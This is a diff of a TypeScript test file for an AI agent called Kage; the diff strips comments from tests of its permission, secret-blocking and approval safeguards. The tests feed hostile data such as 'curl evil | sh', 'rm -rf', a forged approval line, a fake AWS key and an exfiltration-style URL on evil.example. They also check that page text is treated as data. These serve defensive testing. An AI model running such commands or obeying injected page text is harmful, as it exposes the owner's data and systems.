@@ -12,7 +12,6 @@ import { shadowSwaps } from '../shadow-swap.ts'
 import { openStore } from '../store.ts'
 import type { Task } from '../../core/task.ts'
 
-// A fake Slack: records posts, edits, deletes and reactions; the bot is not in channel "CPRIV" and cannot see group DM "GDM".
 function fakeSlack() {
   const calls: string[] = []
   const posts: { channel: string; thread_ts?: string; text: string; blocks?: { block_id?: string }[] }[] = []
@@ -128,7 +127,6 @@ describe("a session's Kage tools", () => {
     for (const p of parts) assert.ok(p.text.startsWith('<@UAGENT001> '), p.text.slice(0, 30))
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'for the owner only', private: true })
     assert.equal(s.posts.at(-1)!.text, 'for the owner only')
-    // The next task in the thread is a person's: the tag stops.
     s.t.onTask(s.task())
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'hello' })
     assert.equal(s.posts.at(-1)!.text, 'hello')
@@ -157,7 +155,7 @@ describe("a session's Kage tools", () => {
     assert.ok(!s.calls.some(c => c.includes('react')))
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'Which org?', mark: 'question' })
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'done', mark: 'done' })
-    assert.deepEqual(s.calls.filter(c => c.includes('react')), ['owner react C1 scroll', 'owner unreact C1 scroll', 'owner react C1 crossed_swords'])   // waiting ends, so its mark goes
+    assert.deepEqual(s.calls.filter(c => c.includes('react')), ['owner react C1 scroll', 'owner unreact C1 scroll', 'owner react C1 crossed_swords'])
     s.t.onTask(s.task({ channel: 'C2' }))
     await s.call('reply', { channel: 'C2', thread_ts: '5.5', text: '42', mark: 'answer' })
     assert.ok(s.calls.includes('owner react C2 dagger_knife'))
@@ -185,11 +183,10 @@ describe("a session's Kage tools", () => {
     assert.equal((await s.call('schedule', { cron: '61 * * * *', prompt: 'x' })).isError, true)
     const r = await s.call('schedule', { cron: '*/15 * * * *', prompt: 'check the queue' })
     assert.match(r.text, /^Kage schedule [0-9a-f]{8} set, recurring/)
-    // The pane runner reads "Scheduled ... job" as Claude's own CronCreate, which would keep the session as watching.
     assert.deepEqual(liveCronJobs([{ timestamp: new Date().toISOString(), text: r.text }], 0, Date.now()), [])
     assert.deepEqual(s.jobs.map(j => [j.cron, j.prompt, j.recurring]), [['*/15 * * * *', 'check the queue', true]])
     assert.match((await s.call('schedules', {})).text, /check the queue/)
-    assert.equal((await s.call('unschedule', { channel: 'C1', thread_ts: '5.5', id: 'ffffffff' })).isError, true)    // not this thread's
+    assert.equal((await s.call('unschedule', { channel: 'C1', thread_ts: '5.5', id: 'ffffffff' })).isError, true)
     assert.equal((await s.call('unschedule', { channel: 'C1', thread_ts: '5.5', id: s.jobs[0].id })).isError, undefined)
     assert.deepEqual(s.jobs, [])
   })
@@ -231,7 +228,6 @@ describe("a session's Kage tools", () => {
     pane.t.onTask(pane.task({ fromOwner: false }))
     assert.equal((await pane.call('schedule', a)).isError, true)
     assert.deepEqual(pane.jobs, [])
-    // A plain schedule from a teammate needs no card, as before.
     assert.match((await pane.call('schedule', { cron: '*/5 * * * *', prompt: 'x' })).text, /^Kage schedule/)
   })
   test('tune_job: the owner changes a job at once, a teammate only with the card, and a job\'s own run never', async () => {
@@ -243,9 +239,8 @@ describe("a session's Kage tools", () => {
     assert.match((await owner.call('tune_job', { ...base, ignore: ['^ts='], cron: '*/10 * * * *' })).text, /tuned/)
     assert.match((await owner.call('tune_job', { ...base, command: 'gh issue list' })).text, /tuned/)
     assert.deepEqual(owner.tuned, [['j1', { ignore: ['^ts='], cron: '*/10 * * * *' }], ['j1', { command: 'gh issue list' }]])
-    assert.deepEqual(cards, [])                                      // the owner's own task stores it at once
-    assert.equal((await owner.call('tune_job', { ...base })).isError, true)   // nothing to change
-    // A teammate's task: any change needs the card, and a no or no card stops it.
+    assert.deepEqual(cards, [])
+    assert.equal((await owner.call('tune_job', { ...base })).isError, true)
     const mate = setup({ approve: ask })
     mate.t.onTask(mate.task({ fromOwner: false }))
     assert.match((await mate.call('tune_job', { ...base, cron: '*/10 * * * *' })).text, /tuned/)
@@ -257,7 +252,6 @@ describe("a session's Kage tools", () => {
     pane.t.onTask(pane.task({ fromOwner: false }))
     assert.equal((await pane.call('tune_job', { ...base, ignore: ['x'] })).isError, true)
     assert.deepEqual([no.tuned, pane.tuned], [[], []])
-    // A run woken by the job's trigger reads outside text, so it may not change its trigger at all, with or without a card or the owner's trust. It reports instead.
     for (const [name, t] of [['its own job', { ...mate.task({ fromOwner: false }), scheduled: true, job: 'j1' }], ['an owner job', { ...mate.task({ fromOwner: true }), scheduled: true, job: 'j1' }], ['another job', { ...mate.task({ fromOwner: true }), scheduled: true, job: 'j2' }]] as const) {
       const run = setup({ approve: ask })
       run.t.onTask(t)
@@ -268,7 +262,7 @@ describe("a session's Kage tools", () => {
       }
       assert.deepEqual(run.tuned, [], name)
     }
-    assert.equal(cards.length, 1)                                    // no new card for a refused run
+    assert.equal(cards.length, 1)
   })
   test('a channel job is stored with a channel trigger and no clock, and bots wake it unless asked otherwise', async () => {
     const s = setup({ approve: async () => true })
@@ -299,7 +293,7 @@ describe("a session's Kage tools", () => {
     assert.equal((await s.call('schedule', { cron: '*/5 * * * *', hook: true, prompt: 'x' })).isError, true)
     assert.equal((await s.call('schedule', { on_channel: { channel: 'C0TEST9' }, hook: true, prompt: 'x' })).isError, true)
     assert.deepEqual(s.jobs, [])
-    const pane = setup()   // no card possible (a tmux pane): neither a hook nor a channel watch
+    const pane = setup()
     pane.t.onTask(pane.task({ fromOwner: true }))
     assert.equal((await pane.call('schedule', { on_channel: { channel: 'C0TEST9' }, prompt: 'x' })).isError, true)
     assert.equal((await pane.call('schedule', { hook: true, prompt: 'x' })).isError, true)
@@ -309,9 +303,9 @@ describe("a session's Kage tools", () => {
     const mate = setup()
     mate.jobs.push({ id: 'j1', key: 'C1:5.5', cron: '*/15 * * * *', prompt: 'p', recurring: true })
     mate.t.onTask(mate.task({ fromOwner: false }))
-    assert.match((await mate.call('move_job', { ...a, to_thread_ts: '1.9' })).text, /no thread starts at 1\.9/)   // a reply's ts, or nothing there
+    assert.match((await mate.call('move_job', { ...a, to_thread_ts: '1.9' })).text, /no thread starts at 1\.9/)
     assert.match((await mate.call('move_job', { ...a, to_channel: 'C2', to_thread_ts: '9.1' })).text, /only the owner/)
-    assert.match((await mate.call('move_job', { ...a, channel: 'C2', to_channel: 'C2', to_thread_ts: '9.1' })).text, /only the owner/)   // a forged channel argument
+    assert.match((await mate.call('move_job', { ...a, channel: 'C2', to_channel: 'C2', to_thread_ts: '9.1' })).text, /only the owner/)
     assert.equal(mate.jobs[0].key, 'C1:5.5')
     assert.equal((await mate.call('move_job', { ...a, to_thread_ts: '9.1' })).isError, undefined)
     assert.equal(mate.jobs[0].key, 'C1:9.1')
@@ -365,8 +359,8 @@ describe("a session's Kage tools", () => {
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'ask <@U1>' })
     s.t.onTask(s.task({ channel: 'C2' }))
     await s.call('reply', { channel: 'C2', thread_ts: '5.5', text: 'ask <@U1>' })
-    assert.ok(s.calls.includes('bot post C1 ask <@U1>'))   // teammate task
-    assert.ok(s.calls.includes('bot post C2 ask <@U1>'))   // owner task
+    assert.ok(s.calls.includes('bot post C1 ask <@U1>'))
+    assert.ok(s.calls.includes('bot post C2 ask <@U1>'))
   })
   test('a secret never goes to a thread on a teammate task', async () => {
     const s = setup()
@@ -390,7 +384,7 @@ describe("a session's Kage tools", () => {
   test('a file goes to the thread a task came from, only as a CSV or a PNG, never with a secret in it', async () => {
     const s = setup()
     s.t.onTask(s.task({ fromOwner: false }))
-    const out = join(s.dir, 'files', 'C1_5.5')   // this thread's own folder
+    const out = join(s.dir, 'files', 'C1_5.5')
     const csv = join(out, 'idle-numbers.csv')
     writeFileSync(csv, 'phone,account\n+15550100248,Riverside Learning\n')
     assert.equal((await s.call('send_file', { channel: 'C1', thread_ts: '5.5', path: csv })).isError, undefined)
@@ -405,16 +399,13 @@ describe("a session's Kage tools", () => {
     const passwords = join(out, 'users.csv')
     writeFileSync(passwords, 'user,Password\nbob,Hunter2Hunter2X9\n')
     assert.equal((await s.call('send_file', { channel: 'C1', thread_ts: '5.5', path: passwords })).isError, true)
-    // Only files written into Kage's files folder go out: not a sheet elsewhere on disk, not a link out of the folder.
     const elsewhere = join(s.dir, 'customers.csv')
     writeFileSync(elsewhere, 'a,b\n1,2\n')
     assert.match((await s.call('send_file', { channel: 'C1', thread_ts: '5.5', path: elsewhere })).text, /files folder/)
     symlinkSync(elsewhere, join(out, 'link.csv'))
     assert.match((await s.call('send_file', { channel: 'C1', thread_ts: '5.5', path: join(out, 'link.csv') })).text, /files folder/)
-    // The type is the real file's: a .png link to a CSV is checked as that CSV.
     symlinkSync(leak, join(out, 'chart.png'))
     assert.equal((await s.call('send_file', { channel: 'C1', thread_ts: '5.5', path: join(out, 'chart.png') })).isError, true)
-    // Another thread's folder is not this thread's to send, even in a session that has both.
     s.t.onTask(s.task({ channel: 'C2' }))
     const other = join(s.dir, 'files', 'C2_5.5', 'owner-only.csv')
     writeFileSync(other, 'a,b\n1,2\n')
@@ -439,7 +430,6 @@ describe("a session's Kage tools", () => {
     assert.ok(s.calls.includes('owner post G-UBO000001,USAM00001 We meet at 3 pm about growth.\n_🥷 Kage_'))
     assert.match(r.text, /https:\/\/x\/G-UBO000001,USAM00001\//)
     assert.equal((await s.call('edit_message', { channel: 'G-UBO000001,USAM00001', ts: '9.1', text: 'We meet at 4 pm.' })).text, 'edited')
-    // Sent from the owner's account, so the edit keeps saying it was Kage.
     assert.ok(s.calls.includes('owner edit G-UBO000001,USAM00001 9.1 We meet at 4 pm.\n_🥷 Kage_'), s.calls.join('\n'))
   })
   test('a call the owner proved with the one-time code may message people; a stranger on a call may not', async () => {
@@ -459,7 +449,7 @@ describe("a session's Kage tools", () => {
     yes.t.onTask(yes.task({ channel: 'whatsapp', thread_ts: '1234@c.us', fromOwner: true }))
     const r = await yes.call('message_people', a)
     assert.equal(r.isError, undefined, r.text)
-    assert.match(cards[0]!, /WhatsApp[\s\S]*Sam \(UBO000001\)[\s\S]*Hello from Alok\./)   // names, so the owner knows who
+    assert.match(cards[0]!, /WhatsApp[\s\S]*Sam \(UBO000001\)[\s\S]*Hello from Alok\./)
     assert.ok(yes.calls.includes('owner post G-UBO000001 Hello from Alok.\n_🥷 Kage_'), yes.calls.join('\n'))
     const no = setup({ approve: async () => false })
     no.t.onTask(no.task({ channel: 'whatsapp', thread_ts: '1234@c.us', fromOwner: true }))
@@ -468,7 +458,6 @@ describe("a session's Kage tools", () => {
     const pane = setup()
     pane.t.onTask(pane.task({ channel: 'whatsapp', thread_ts: '1234@c.us', fromOwner: true }))
     assert.equal((await pane.call('message_people', a)).isError, true)
-    // Everyone the message reaches is on the card, the person it is sent for too, and a refusal comes before any card.
     const seen: string[] = []
     const all = setup({ approve: async (_t, d) => { seen.push(d); return true } })
     all.t.onTask(all.task({ channel: 'whatsapp', thread_ts: '1234@c.us', fromOwner: true }))
@@ -478,11 +467,9 @@ describe("a session's Kage tools", () => {
     assert.equal((await all.call('message_people', { ...a, users: nine })).isError, true)
     assert.equal((await all.call('message_people', { ...a, text: 'key AKIAABCDEFGHIJKLMNOP' })).isError, true)
     assert.equal(seen.length, 1)
-    // A WhatsApp task that is not the owner's never reaches a card.
     const other = setup({ approve: async () => { assert.fail('no card for a task that is not the owner\'s') } })
     other.t.onTask(other.task({ channel: 'whatsapp', thread_ts: '1234@c.us', fromOwner: false }))
     assert.equal((await other.call('message_people', a)).isError, true)
-    // Email stays refused, card or not.
     const mail = setup({ approve: async () => true })
     mail.t.onTask(mail.task({ channel: 'email', thread_ts: 'mail:1', fromOwner: true }))
     assert.equal((await mail.call('message_people', { ...a, channel: 'email', thread_ts: 'mail:1' })).isError, true)
@@ -493,7 +480,6 @@ describe("a session's Kage tools", () => {
     await s.call('message_people', { channel: 'C1', thread_ts: '5.5', users: ['UBO000001'], text: 'We meet at 3 pm.' })
     assert.ok(s.calls.includes('owner open UBO000001,USAM00001'))
     assert.ok(s.calls.includes('owner post G-UBO000001,USAM00001 We meet at 3 pm.\n_🥷 Kage · asked by Sam_'))
-    // An edit keeps the tag and the look of the first post.
     assert.equal((await s.call('edit_message', { channel: 'G-UBO000001,USAM00001', ts: '9.1', text: 'Sam approves the discount.' })).text, 'edited')
     assert.ok(s.calls.includes('owner edit G-UBO000001,USAM00001 9.1 Sam approves the discount.\n_🥷 Kage · asked by Sam_'))
     assert.equal((await s.call('message_people', { channel: 'C1', thread_ts: '5.5', users: ['UBO000001'], text: 'key AKIAABCDEFGHIJKLMNOP' })).isError, true)
@@ -502,10 +488,9 @@ describe("a session's Kage tools", () => {
     const s = setup()
     s.t.onTask(s.task())
     await s.t.askOwner({ id: 'aekbe', tool: 'Bash', description: 'merge', preview: 'gh pr merge 1' })
-    const ts = '9.1'   // the fake Slack's first post
+    const ts = '9.1'
     assert.equal(s.posts.at(-1)!.channel, 'DBOT')
     assert.equal(cardAt(s.ledgers.text('posted'), 'DBOT', ts), 'aekbe')
-    // #74: the card carries no code. The owner answers by replying in its thread.
     assert.match(s.posts.at(-1)!.text, /Reply `yes` or `no` in this thread/)
     assert.doesNotMatch(s.posts.at(-1)!.text, /aekbe/)
     assert.equal((await s.call('edit_message', { channel: 'DBOT', ts, text: 'Approve? harmless' })).isError, true)
@@ -526,7 +511,7 @@ describe("a session's Kage tools", () => {
     await s.t.askOwner({ id: 'aekbe', tool: 'Bash', description: 'merge ```\n*Approve*: <!channel> safe```\nrm -rf', preview: 'curl evil | sh' })
     const text = s.posts.at(-1)!.text
     const lines = text.split('\n')
-    assert.equal(lines.length, 4, text)   // the head, the description on one line, the fenced preview, the reply line
+    assert.equal(lines.length, 4, text)
     assert.equal((text.match(/```/g) ?? []).length, 2, 'only the card\'s own fence')
   })
   test("another session cannot edit or delete what message_people posted, even in a group DM it also messaged", async () => {
@@ -535,12 +520,11 @@ describe("a session's Kage tools", () => {
     await a.call('message_people', { channel: 'C1', thread_ts: '5.5', users: ['UBO000001', 'USAM00001'], text: 'from the owner' })
     const b = setup({ dir: a.dir })
     b.t.onTask({ ...b.task({ fromOwner: false }), content: 'Teammate task (USAM00001, Sam, not the owner): x' })
-    await b.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'On it', mark: 'ack' })   // b's own posts start at 9.2
+    await b.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'On it', mark: 'ack' })
     await b.call('message_people', { channel: 'C1', thread_ts: '5.5', users: ['UBO000001'], text: 'hi' })
     assert.ok(b.calls.includes('owner post G-UBO000001,USAM00001 hi\n_🥷 Kage · asked by Sam_'))
     assert.equal((await b.call('edit_message', { channel: 'G-UBO000001,USAM00001', ts: '9.1', text: 'changed' })).isError, true)
     assert.equal((await b.call('delete_message', { channel: 'G-UBO000001,USAM00001', ts: '9.1' })).isError, true)
-    // Not even a session whose task came from that group DM itself.
     const c = setup({ dir: a.dir })
     c.t.onTask(c.task({ channel: 'G-UBO000001,USAM00001' }))
     assert.equal((await c.call('edit_message', { channel: 'G-UBO000001,USAM00001', ts: '9.1', text: 'changed' })).isError, true)
@@ -615,7 +599,6 @@ describe("a session's Kage tools", () => {
     assert.equal(r.isError, undefined)
     assert.match(r.text, /not posted/)
     assert.ok(!s.calls.some(c => c.startsWith('owner post')), s.calls.join('\n'))
-    // Where the bot is a member, the ack still posts.
     s.t.onTask(s.task())
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'On it: y', mark: 'ack' })
     assert.ok(s.calls.includes('bot post C1 On it: y'))
@@ -626,10 +609,10 @@ describe("a session's Kage tools", () => {
     await s.call('reply', { channel: 'CPRIV', thread_ts: '5.5', text: 'v1' })
     assert.equal((await s.call('edit_message', { channel: 'CPRIV', ts: '9.1', text: 'v2' })).text, 'edited')
     assert.ok(s.calls.includes('owner edit CPRIV 9.1 v2\n_🥷 Kage_'))
-    assert.equal((await s.call('edit_message', { channel: 'CPRIV', ts: '0.1', text: 'x' })).isError, true)   // not ours
-    assert.equal((await s.call('delete_message', { channel: 'COTHER', ts: '9.1' })).isError, true)          // not this session's
+    assert.equal((await s.call('edit_message', { channel: 'CPRIV', ts: '0.1', text: 'x' })).isError, true)
+    assert.equal((await s.call('delete_message', { channel: 'COTHER', ts: '9.1' })).isError, true)
     assert.equal((await s.call('delete_message', { channel: 'CPRIV', ts: '9.1' })).text, 'deleted')
-    assert.equal((await s.call('delete_message', { channel: 'CPRIV', ts: '9.1' })).isError, true)           // already gone
+    assert.equal((await s.call('delete_message', { channel: 'CPRIV', ts: '9.1' })).isError, true)
   })
   test('email and WhatsApp replies are handed to the hub, not posted', async () => {
     const s = setup()
@@ -716,11 +699,11 @@ describe("a session's Kage tools", () => {
   })
   test('a private reply goes into the DM thread the owner answered in, until a task comes from elsewhere', async () => {
     const s = setup()
-    s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '5.6', thread: '5.5' } })   // a channel thread reply is not a DM thread
+    s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '5.6', thread: '5.5' } })
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'first', private: true })
     s.t.onTask({ ...s.task(), origin: { channel: 'DBOT', ts: '8.2', thread: '8.1' } })
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'second', private: true })
-    s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '' }, scheduled: true })    // a scheduled run keeps the DM thread
+    s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '' }, scheduled: true })
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'reminder', private: true })
     s.t.onTask(s.task())
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'third', private: true })
@@ -742,7 +725,7 @@ describe("a session's Kage tools", () => {
     assert.match(s.posts.at(-1)!.text, /^<@UTEAM0001> Can you run/)
     assert.equal((await s.call('waiting', {})).text, 'nothing is waiting')
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: '<@UTEAM0001> and the web call?', waiting: 'Web call', waiting_on: 'UTEAM0001' })
-    assert.equal(s.posts.at(-1)!.text.match(/<@UTEAM0001>/g)!.length, 1)   // already tagged: not tagged twice
+    assert.equal(s.posts.at(-1)!.text.match(/<@UTEAM0001>/g)!.length, 1)
   })
   test('a wait that names nobody, or no valid person, is refused before it posts', async () => {
     const s = setup()
@@ -773,7 +756,7 @@ describe("a session's Kage tools", () => {
     await s.call('reply', { channel: 'C1', thread_ts: '5.5', text: 'PR?', waiting: 'Open a PR?', waiting_on: 'owner' })
     s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '' }, scheduled: true })
     assert.match((await s.call('waiting', {})).text, /Open a PR\?/)
-    s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '' } })   // kage tell: the owner, with no Slack message behind it
+    s.t.onTask({ ...s.task(), origin: { channel: 'C1', ts: '' } })
     assert.equal((await s.call('waiting', {})).text, 'nothing is waiting')
   })
   test('a task logs an answer only when its thread had an open question', async () => {
@@ -803,7 +786,6 @@ describe("a session's Kage tools", () => {
     assert.equal((await s.call('kagelets', { channel: 'C1', thread_ts: '5.5' })).text, 'the list')
     assert.equal((await s.call('manage_kagelet', { channel: 'C1', thread_ts: '5.5', action: 'save', name: 'status', thread: 'L', schedule: '0 9 * * *', tools: ['WebSearch'], job: 'j', why: 'w' })).text, 'managed')
     assert.deepEqual(s.out, ['manage {"action":"save","name":"status","thread":"L","schedule":"0 9 * * *","tools":["WebSearch"],"job":"j","why":"w"}'])
-    // The model gets no field that says who asked: it could claim the owner did.
     assert.equal('by' in s.t.tools.find(x => x.name === 'manage_kagelet')!.shape, false)
     const lane = setup({ kagelet: 'status' })
     assert.equal(lane.t.tools.some(x => x.name === 'kagelets' || x.name === 'manage_kagelet'), false)
@@ -812,16 +794,14 @@ describe("a session's Kage tools", () => {
   test('a kagelet\'s dream session has propose_memory for its own kagelet and nothing of the manager\'s; the manager reviews and never proposes', async () => {
     const dream = setup({ dreaming: 'status' })
     dream.t.onTask(dream.task({ fromOwner: false }))
-    // Exactly the thread tools Kage gives every session, and propose_memory: no manager, browser or post_as_kage tool.
     const names = dream.t.tools.map(x => x.name)
     assert.ok(names.includes('propose_memory'))
     for (const n of ['kagelets', 'manage_kagelet', 'review_kagelet_memory', 'report', 'post_as_kage']) assert.equal(names.includes(n), false, n)
     assert.equal(names.some(n => n.startsWith('browser_')), false)
-    // The kagelet is the lane's, never an argument: a name in the call is not a field.
     assert.equal('kagelet' in dream.t.tools.find(x => x.name === 'propose_memory')!.shape, false)
     assert.equal((await dream.call('propose_memory', { channel: 'C1', thread_ts: '5.5', file: 'a.md', text: 't', why: 'w' })).text, 'proposed')
     assert.deepEqual(dream.out, ['propose status C1:5.5 {"file":"a.md","text":"t","why":"w"}'])
-    assert.equal((await dream.call('propose_memory', { channel: 'C1', thread_ts: '9.9', file: 'a.md', text: 't', why: 'w' })).isError, true)   // not its own thread
+    assert.equal((await dream.call('propose_memory', { channel: 'C1', thread_ts: '9.9', file: 'a.md', text: 't', why: 'w' })).isError, true)
     const m = setup()
     assert.equal(m.t.tools.some(x => x.name === 'propose_memory'), false)
     assert.equal(setup({ kagelet: 'status' }).t.tools.some(x => x.name === 'review_kagelet_memory' || x.name === 'propose_memory'), false)
@@ -844,12 +824,10 @@ describe("a session's Kage tools", () => {
     assert.equal((await s.call('manage_kagelet', save)).isError, true)
     assert.equal(asked.length, 1)
     assert.match(s.ledgers.text('grants'), /\tcalls\trefused\tnot the owner's task\tmcp__gmail__send/)
-    // Without a card (tmux panes), the manager gets no way to ask.
     const pane = setup()
     pane.t.onTask(pane.task())
     assert.equal((await pane.call('manage_kagelet', save)).text, 'managed')
   })
-  // A stand-in for the owner's read command: prints two rows, and keeps the query it got as its last argument.
   const reader = (dir: string, out = 'id\tcalls\n1\t40\n2\t12\n') => {
     writeFileSync(join(dir, 'read.sh'), `printf '${out}'; for a; do q=$a; done; printf '%s' "$q" > ${join(dir, 'query')}`)
     return { command: () => `sh ${join(dir, 'read.sh')} --read-only`, maxRows: 200 }
@@ -881,7 +859,6 @@ describe("a session's Kage tools", () => {
     const row = s.ledgers.text('db-reads').trim().split('\t')
     assert.deepEqual([row[1], row[2], row[4]], ['calls', '3', 'ok'])
     assert.match(row[3]!, /^\d+ms$/)
-    // The row's own fields only: its leading timestamp may hold "40" by chance.
     assert.doesNotMatch(row.slice(1).join('\t'), /40/)
   })
   test('db_read refuses a write without running the command, and logs the refusal', async () => {
@@ -922,16 +899,16 @@ describe("a session's Kage tools", () => {
     assert.ok(s.routed.includes('tell fude now: use the drafts folder'))
     assert.match((await s.call('tell_kagelet', { ...a, name: 'kane', text: 'x' })).text, /only answer fude/)
     s.jobs.push({ id: 'j1', key: 'C1:5.5', cron: '*/5 * * * *', prompt: 'p', recurring: true })
-    assert.equal((await s.call('unschedule', { ...a, id: 'j1' })).isError, true)   // the need's words are data, like a job run's
+    assert.equal((await s.call('unschedule', { ...a, id: 'j1' })).isError, true)
     s.t.onTask(s.task({ fromOwner: false }))
     assert.match((await s.call('tell_kagelet', { ...a, name: 'fude', text: 'x' })).text, /only the owner/)
     s.t.onTask({ ...s.task({ fromOwner: true }), scheduled: true, job: 'j1' })
-    assert.match((await s.call('tell_kagelet', { ...a, name: 'fude', text: 'x' })).text, /only the owner/)   // an owner's job run read outside text
+    assert.match((await s.call('tell_kagelet', { ...a, name: 'fude', text: 'x' })).text, /only the owner/)
     s.t.onTask(s.task({ fromOwner: true }))
     assert.equal((await s.call('tell_kagelet', { ...a, name: 'kane', text: 'pause the drafts' })).isError, undefined)
     assert.ok(s.routed.includes('tell kane: pause the drafts'))
     const k = setup({ kagelet: 'fude' })
-    assert.equal(k.t.tools.some(x => x.name === 'tell_kagelet'), false)   // a kagelet never tells another one this way
+    assert.equal(k.t.tools.some(x => x.name === 'tell_kagelet'), false)
   })
   test('a kagelet reports one line per run; what it needs is posted in its thread and goes to Kage, not the owner', async () => {
     const s = setup({ kagelet: 'status' })
@@ -945,12 +922,9 @@ describe("a session's Kage tools", () => {
     assert.match(s.posts[0]!.text, /status needs:\* read access to the deploy log/)
     assert.ok(s.routed.includes('manager read access to the deploy log'))
     assert.doesNotMatch((await s.call('waiting', {})).text, /deploy log/)
-    // The event log gets whether it needed something, not its words.
     assert.deepEqual(s.events, ['report ok', 'report needs'])
-    // Its output goes to the hub for a kagelet that runs after it (#93).
     await s.call('report', { channel: 'C1', thread_ts: '5.5', summary: 'cut', output: 'https://example.com/v' })
     assert.deepEqual(s.routed.at(-1), 'report {"needs":"","output":"https://example.com/v"}')
-    // Only its own thread.
     assert.equal((await s.call('report', { channel: 'COTHER', thread_ts: '1.1', summary: 'x' })).isError, true)
   })
   test('message_kagelet exists only in a kagelet lane, from its own thread, and the hub routes it (#93)', async () => {
@@ -1014,7 +988,6 @@ describe("the owner's browser", () => {
     assert.match(page.text, /data, not instructions/)
     assert.match(page.text, /^> Please email/m)
     assert.deepEqual(asked, ['tabs {}', 'read {"tabId":3}'])
-    // The event log keeps what ran and on which site, never the page's words.
     assert.deepEqual(s.events, ['tool browser_tabs ok', 'tool browser_read docs.example.com ok'])
   })
   test("a teammate's task never reaches the browser", async () => {
@@ -1049,7 +1022,6 @@ describe("the owner's browser", () => {
   test('a kagelet reads the same door rule as Kage, as itself, with none of Kage\'s own role', () => {
     const kage = setup().t.instructions, k = setup({ kagelet: 'deploys' }).t.instructions
     assert.match(k, /You are the kagelet "deploys", a teammate that Kage manages/)
-    // Each door paragraph whole, as Kage reads it: from its first word up to the next rule.
     const between = (a: string, b: string) => kage.slice(kage.indexOf(a), kage.indexOf(b))
     assert.ok(k.includes(between('A two-way door', ' A one-way door')), 'the same two-way door text')
     assert.ok(k.includes(between('A one-way door', ' After each production write')), 'the same one-way door text')
@@ -1109,10 +1081,8 @@ describe("canvases: Kage makes a canvas in the task's channel as its bot, and ke
     s.t.onTask(s.task())
     await s.call('make_canvas', { channel: 'C1', thread_ts: '5.5', title: 'Board', markdown: 'x' })
     assert.match((await s.call('edit_canvas', { channel: 'C1', thread_ts: '5.5', canvas_id: 'F0SOMEONE', markdown: 'y' })).text, /did not make/)
-    // Another thread in the same channel: the canvas is not its own.
     s.t.onTask(s.task({ thread_ts: '6.6' }))
     assert.match((await s.call('edit_canvas', { channel: 'C1', thread_ts: '6.6', canvas_id: 'F0CANVAS1', markdown: 'y' })).text, /did not make/)
-    // A new session on the same thread (after a restart) still owns it: the ledger keeps it.
     const again = setup({ dir: s.dir })
     again.t.onTask(again.task())
     assert.equal((await again.call('edit_canvas', { channel: 'C1', thread_ts: '5.5', canvas_id: 'F0CANVAS1', markdown: 'z' })).isError, undefined)
@@ -1122,7 +1092,7 @@ describe("canvases: Kage makes a canvas in the task's channel as its bot, and ke
     const owner = setup()
     owner.t.onTask(owner.task())
     await owner.call('make_canvas', { channel: 'C1', thread_ts: '5.5', title: 'Board', markdown: 'x' })
-    const other = setup({ dir: owner.dir })   // a teammate's session in another thread of the same channel
+    const other = setup({ dir: owner.dir })
     other.t.onTask(other.task({ fromOwner: false, thread_ts: '6.6' }))
     assert.match((await other.call('edit_canvas', { channel: 'C1', thread_ts: '5.5', canvas_id: 'F0CANVAS1', markdown: 'overwritten' })).text, /did not make/)
     assert.match((await other.call('make_canvas', { channel: 'C1', thread_ts: '5.5', title: 'Fake', markdown: 'y' })).text, /no task came from/)
@@ -1231,9 +1201,7 @@ describe("acting in the owner's browser", () => {
     assert.match(cards[0]!, /^mail\.example\.com: click button "Send"$/)
     assert.ok(asked.includes('click'))
     assert.ok(yes.events.includes('tool browser_act click mail.example.com ok'), yes.events.join('|'))
-    // The owner sees the page before deciding: its screenshot goes to their DM with Kage, never to the thread.
     assert.ok(yes.calls.some(c => /^bot file DBOT .*\.png$/.test(c)), yes.calls.join('|'))
-    // For a control, the picture is the control itself as the screen draws it, since CSS can draw text the DOM lacks.
     assert.ok(asked.includes('crop'), asked.join(','))
     const asked2: string[] = []
     const no = setupAct({ asked: asked2 }, asking(false, []))
@@ -1254,7 +1222,6 @@ describe("acting in the owner's browser", () => {
     const s = setupAct({}, asking(true, cards))
     assert.equal((await s.call('browser_act', { ...at, action: 'open', url: 'https://mail.example.com/inbox' })).isError, undefined)
     assert.deepEqual(cards, [])
-    // A site no tab is on asks first: page text could steer Kage to an address that carries what it read.
     await s.call('browser_act', { ...at, action: 'open', url: 'https://evil.example/?d=inbox' })
     assert.equal(cards.length, 1)
   })
@@ -1379,7 +1346,7 @@ describe('set_setting: the owner changes a setting through Kage, never by writin
     }
     const k = setup({ kagelet: 'watch', settings: { set: () => {} } })
     assert.equal(k.t.tools.some(x => x.name === 'set_setting'), false)
-    assert.equal(setup().t.tools.some(x => x.name === 'set_setting'), false)   // no hub settings route (a tmux pane): no tool
+    assert.equal(setup().t.tools.some(x => x.name === 'set_setting'), false)
   })
   test('a value the settings refuse comes back as an error the session can read', async () => {
     const s = setup({ settings: { set: () => { throw new Error('connectors.voice.port must be a port from 1 to 65535') } } })
@@ -1409,7 +1376,7 @@ describe('the meeting bot (#63)', () => {
     const s = setup({ meetbot: fakeBot(asked) })
     s.t.onTask(s.task({ fromOwner: false }))
     s.t.onTask(s.task({ channel: 'voice', thread_ts: 'voice:x', fromOwner: true }))
-    s.t.onTask({ ...s.task({ channel: 'C2' }), agent: { app: 'ATEST0001' } })   // a listed agent, even in an owner thread
+    s.t.onTask({ ...s.task({ channel: 'C2' }), agent: { app: 'ATEST0001' } })
     for (const [channel, thread_ts] of [['C1', '5.5'], ['voice', 'voice:x'], ['C2', '5.5']]) {
